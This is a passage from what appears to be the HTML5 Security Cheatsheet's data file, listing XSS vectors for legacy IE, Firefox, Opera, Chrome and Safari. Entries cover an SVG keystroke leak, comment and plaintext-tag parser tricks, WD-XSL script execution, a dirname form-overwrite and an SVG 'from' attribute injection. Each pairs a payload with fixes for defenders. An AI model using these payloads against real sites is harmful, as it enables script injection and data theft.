            'ru'    : 'С помощью атрибута условий begin SVG-элементов <set> и <animate> можно осуществить инъекцию, позволяющую отследить клавиатурные (и не только) события без использования JavaScript. Язык SVG позволяет обусловить срабатывание события нажатием определенных клавиш. В случае со встроенным SVG слушатель этих нажатий наблюдает за всем документом, а не только за SVG-частью. Это означает, что каждое нажатие клавиши, например, в форме ввода вызовет соответствующий SVG-обработчик.\r\n\r\nПосле того как обработчик нажатия отдельной клавиши будет связан с переопределением характерного для него адреса изображения, заполнение формы приведет к изменению адреса скрытой картинки в соотвествии с нажатой клавишей и тем самым к утечке данных.\r\n\r\nПоскольку все это работало без использования JavaScript, было возможно провести данную атаку в Thunderbird через вектор, незаметно внедренный в тело сообщения.\r\n\r\nПроблема была обозначена в CVE-2011-3663 и исправлена.\r\n\r\nМожно также отметить, что ранее известные способы обрабатывать нажатия клавиш (атрибут accesskey или CSS-свойство -wap-accesskey, реализованное в Opera) позволяют это сделать только при дополнительном нажатии некого сочетания управляющих клавиш, чего не было в SVG от Firefox.',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'urls'      : ['http://www.mozilla.org/security/announce/2011/mfsa2011-56.html', 'https://bugzilla.mozilla.org/show_bug.cgi?id=704482', 'http://www.w3.org/TR/SVG/animate.html#TimingAttributes'],
        'howtofix'  : {
            'en'    : '',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'firefox': ['4', '5', '6', '7', '8', '9', '15']
        },
        'tags'      : [ 'svg', 'html5', 'noscript', 'keylogger', 'firefox', 'thunderbird'],
        'reporter'  : '.mario'
    },
    { /* ID 133 - Ending HTML comments with a backtick character */
        'id'        : 133,
        'category'  : 'html',
        'name'      : {
            'en'    : 'Ending HTML comments with a backtick character',
            'ja'    : '',
            'ru'    : 'Окончание HTML-псевдокомментария незавершенным параметром.',
            'cs'    : '',
            'de'    : '',
            'zh'    : '使用属性界定符打破IE注释元素'
        },
        'data'      : '<!-- `<img/src=xx:xx onerror=%js_alert%//--!>',
        'description' : {
            'en'    : 'On older versions of the Internet Explorer, a backtick charcater can be utilized to end a HTML comment and inject otherwise commented markup. A HTML filter allowing comments can be bypassed with this trick and allow an attacker to inject arbitrary HTML.',
            'ja'    : '',
            'ru'    : 'В указанных ниже версиях Internet Explorer\'а существует следующая особенность в обработке HTML-комментариев, неприсущая другим популярным браузерам. Она состоит в том, что необходимым условием существования комментария, наряду с прочими, считается его правильное окончание ("-->" для обычного HTML-комментария). В других браузерах условие существования комментария это только правильное его начало. Если IE встречает начало комментария (в данном случае это "<!--"), но не находит конец (в данном случае конца нет, так как "--!>" - это неправильное завершение комментария для IE), то парсит эту конструкцию по правилам спецтегов, которые указаны в #91. А именно IE будет воспринимать такую конструкцию как обычный (пользовательский) тег, допускающий параметры. Второй приём, использованный в данном примере, это незаконченный псевдопараметр (обратный апостроф). Данная техника уже описывалась в #62 и #102.',
            'cs'    : '',
            'de'    : '',
            'zh'    : '在IE9以下的版本中中可以使用`打破注释元素'
        },
        'urls'      : ['#62','#102', '#115'],
        'howtofix'  : {
            'en'    : 'Make sure, an attacker cannot inject into HTML comments and consider the string "-->" by far not the only way to end a HTML comment.',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : '不允许用户提交注释标签'
        },
        'browsers'  : {
            'internet explorer': ['6.0', '7.0', '8.0']
        },
        'tags'      : ['xss', 'comments', 'internet explorer', 'backtick'],
        'reporter'  : 'jackmasa'
    },
    { /* ID 134 - "<% %>" and "<!-- -->" inside plaintext tags */
        'id'        : 134,
        'category'  : 'html',
        'name'      : {
            'en'    : '"<% %>" and "<!-- -->" inside plaintext tags',
            'ja'    : '',
            'ru'    : '"<% %>" и "<!-- -->" внутри тегов с текстовым содержимым',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'data'      : '<xmp>\r\n<%\r\n</xmp>\r\n<img alt=\'%></xmp><img src=xx:x onerror=%js_alert%//\'>\r\n\r\n<script>\r\nx=\'<%\'\r\n</script> %>/\r\n%js_alert_2%\r\n</script>\r\n\r\nXXX\r\n<style>\r\n*[\'<!--\']{}\r\n</style>\r\n-->{}\r\n*{color:red}</style>',
        'description' : {
            'en'    : 'Structures "<%" и "<!--" allow the IE parser to consider closing tag in plaintext tags such as <textarea>, <comment>, <xmp> and others as a part of the plaintext until it finds the structure "%>" or "-->". The syntax in the tags such as <style>, <script> should be valid taking into account these sections, otherwise throws an exception. So, the second example shows that closing <\/script> tag will be considered as an operator "less" and the regular expression start. The examples are worked up to IE 9 standards mode. SGML-like comment delimiters is similarly parsed in older versions of Safari.',
            'ja'    : '',
            'ru'    : 'Структуры "<%" и "<!--" позволяют IE анализатору рассматривать закрывающий тег в тегах с текстовым содержимым, таких как <textarea>, <comment>, <xmp> и других, как часть текста, пока он не найдет структуры "%>" или "-->". Обратите внимание, что в тегах, которые имеют свой собственный синтаксис, таких как <style>, <script>, синтаксис должен быть верным с учетом данных структур под угрозой возникновения ошибки. Так, второй пример показывает, что закрывающий тег <\/script> будет рассматриваться как оператор "меньше" и начало регулярного выражения. Примеры будут работать вплоть до режима стандартов IE 9. SGML-подобные ограничители комментариев похожим образом разбирались в более ранних версиях Safari.', 
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'urls'      : ['#91', '#38', '#40'],
        'howtofix'  : {
            'en'    : 'Encode all opening brakets inside plaintext tags. Escape for the closing tags ("<\\/script>") is not sufficient.',
            'ja'    : '',
            'ru'    : 'Кодируйте все открывающие скобки внутри тегов с текстовым содержимым. Эскейпирование закрывающих тегов ("<\\/script>") не является достаточной мерой.',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', '10.0'],
            'safari': [ '3.0', '4.0', '4.0.3', 'end']
        },
        'tags'      : ['xss', 'plaintext', 'internet explorer', 'safari', 'comment', 'SGML', 'escape'],
        'reporter'  : 'sirdarckcat, wpulog'
    },
    { /* ID 135 - Executing JavaScript with WD-XSL, <eval> elements and "expr" attributes */
        'id'        : 135,
        'category'  : 'xml',
        'name'      : {
            'en'    : 'Executing JavaScript with WD-XSL, <eval> elements and "expr" attributes',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'data'      : '<?xml-stylesheet type="text/xsl" href="#" ?>\r\n<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">\r\n<template match="/">\r\n<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval>\r\n<if expr="new ActiveXObject(\'htmlfile\').parentWindow.alert(2)"></if>\r\n</template>\r\n</stylesheet>',
        'description' : {
            'en'    : 'Internet Explorer, when loading an XML document in an older document mode, allows the use of a legacy XSL version called WD-XSL. This version, shipped with several proprietary extras, allows execution of JavaScript and other script code in very uncommon ways. The browser for instance supports an <eval> element and "expr" attributes that can directly be fed with script code or references to existing JavaScript and XMLDOM methods. Other than MSXSL script, direct DOM access is possible with the use of WD-XSL.',
            'ja'    : '',
            'ru'    : '', 
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'urls'      : [
        				'http://web.archive.org/web/20000816185012/http://msdn.microsoft.com/xml/reference/xsl/XSLElements.asp', 
        				'http://web.archive.org/web/20000816000901/http://msdn.microsoft.com/xml/reference/xsl/xslmethods.asp'
        			],
        'howtofix'  : {
            'en'    : 'Websites rendered in XML- or XML-like MIME types should not allow untrusted input without heavy filtering. Unknown elements can cause unexpected script execution depending on browser and render mode. The use of custom namespaces in user generated input should be prohibited.',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0', '10.0']
        },
        'tags'      : ['xss', 'xslt', 'internet explorer', 'xml', 'wdxsl', 'legacy'],
        'reporter'  : '.mario'
    },
    { /* ID 136 - Transparent overwriting of request-data using HTML5 "dirname" attributes */
        'id'        : 136,
        'category'  : 'html5',
        'name'      : {
            'en'    : 'Transparent overwriting of request-data using HTML5 "dirname" attributes',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'data'      : '<form action="" method="post">\r\n<input name="username" value="admin" />\r\n<input name="password" type="password" value="secret" />\r\n<input name="injected" value="injected" dirname="password" />\r\n<input type="submit">\r\n</form>',
        'description' : {
            'en'    : 'Opera and Chrome support the HTML5 attribute "dirname", that can be used to have the browser communicate the text-flow direction of another input element by adding it to the server-sent request body. By injecting a "dirname" attribute in an existing form, an attacker can overwrite user input and thereby make it guessable for malicious purposes. The overwritten value would then be "ltr" or "rtl" - depending on the actual text-flow direction. The "dirname" attribute is not yet supported by Internet Explorer or Firefox.',
            'ja'    : '',
            'ru'    : '', 
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'urls'      : [
        				'http://dev.w3.org/html5/spec/common-input-element-attributes.html#the-dirname-attribute', 
        				'http://html5sec.org/dirname/'
        			],
        'howtofix'  : {
            'en'    : 'Avoid white-listing the "dirname" attribute in user generated content. The effects on existing forms are hard to predict and might cause privacy problems and information leaks.',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'opera': ['12.0'],
            'chrome': ['22.0', '23.0', '24.0', '25.0']
        },
        'tags'      : ['html5', 'dirname', 'privacy', 'http', 'form', 'infoleak'],
        'reporter'  : '.mario'
    },
    { /* ID 137 - Executing JavaScript via "from" attribute in SVG and inline-SVG */
        'id'        : 137,
        'category'  : 'svg',
        'name'      : {
            'en'    : 'Executing JavaScript via "from" attribute in SVG and inline-SVG',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'data'      : '<svg>\r\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">\r\n<circle r="400"></circle>\r\n<animate attributeName="xlink:href" begin="0" from="%js_uri_alert%" to="&" />\r\n</a>',
        'description' : {
            'en'    : 'It is commonly known, that the <animate> element in combination with the "to" parameter can be used to change existing attributes to potentially active values and cause arbitrary script execution. It is nevertheless also possible to use the "from" attribute for the very same purpose - albeit this being rather counter-intuitive. The given example code snippet describes an SVG containing a circle that encapsulates an <animate> element. This uses the "from" attribute to set the "href" attribute of the link encapsulating the circle to a JavaScript URI. Clicking the circle will execute the JavaScript.',
            'ja'    : '',
            'ru'    : '', 
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'urls'      : [
        				'http://jsbin.com/uxadon/3',
        				'http://www.w3.org/TR/SVG/animate.html#FromAttribute'
        			],
        'howtofix'  : {
            'en'    : 'Avoid inline-SVG in combination with user-generated content. In case SVG needs to be used, avoid potentially harmful content for "to", "from", "values" and "by" attributes.',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
        	'firefox' : ['25.0', '27.0'],
            'opera':  	['15.0'],
            'chrome': 	['30.0', '32.0'],
            'safari': 	[ '5.0', '6.0']
        },
        'tags'      : ['html5', 'svg', 'from', 'inline', 'xss', 'passive'],
        'reporter'  : '.mario'
    }    
]